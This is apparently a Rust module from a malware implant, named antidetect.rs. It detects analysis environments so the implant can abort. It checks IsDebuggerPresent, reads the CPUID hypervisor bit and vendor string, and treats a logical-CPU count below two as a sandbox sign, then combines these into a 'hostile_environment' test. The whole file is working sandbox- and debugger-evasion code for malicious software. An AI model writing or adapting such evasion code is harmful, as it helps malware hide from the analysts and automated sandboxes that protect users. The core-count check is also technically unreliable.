//! antidetect.rs — sandbox / analyst environment checks
//!
//! Returns true when the implant should abort (hostile analysis environment).

#![allow(dead_code)]

use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::processthreadsapi::GetCurrentProcess;

/// Returns true if a debugger is attached.
pub fn is_debugger_present() -> bool {
    unsafe { IsDebuggerPresent() != 0 }
}

/// CPUID leaf 1 — hypervisor bit (ECX bit 31).
/// Returns the hypervisor vendor string if present.
pub fn hypervisor_vendor() -> Option<[u8; 12]> {
    let ecx_val: u32;
    let ebx_out: u32;
    let ecx_out: u32;
    let edx_out: u32;
    unsafe {
        core::arch::asm!(
            "push rbx",
            "cpuid",
            "mov {:e}, ebx",
            "pop rbx",
            out(reg) ebx_out,
            inout("eax") 0x40000000u32 => _,
            out("ecx") ecx_out,
            out("edx") edx_out,
            options(nostack, nomem),
        );
        core::arch::asm!(
            "cpuid",
            inout("eax") 1u32 => _,
            out("ebx") _,
            out("ecx") ecx_val,
            out("edx") _,
            options(nostack, nomem),
        );
    }
    // Hypervisor present bit = ECX[31]
    if ecx_val & (1 << 31) == 0 {
        return None;
    }
    let mut vendor = [0u8; 12];
    vendor[0..4].copy_from_slice(&ebx_out.to_le_bytes());
    vendor[4..8].copy_from_slice(&ecx_out.to_le_bytes());
    vendor[8..12].copy_from_slice(&edx_out.to_le_bytes());
    Some(vendor)
}

/// Returns true if the logical CPU count is suspiciously low (< 2).
/// Single-vCPU VMs are common in sandbox setups.
pub fn is_low_core_count() -> bool {
    let ebx_val: u32;
    unsafe {
        core::arch::asm!(
            "push rbx",
            "cpuid",
            "mov {:e}, ebx",
            "pop rbx",
            out(reg) ebx_val,
            inout("eax") 1u32 => _,
            out("ecx") _,
            out("edx") _,
            options(nostack, nomem),
        );
    }
    let logical_count = (ebx_val >> 16) & 0xFF;
    logical_count < 2
}

/// Composite check — returns true if environment looks hostile.
pub fn hostile_environment() -> bool {
    is_debugger_present()
        || hypervisor_vendor().is_some()
        || is_low_core_count()
}
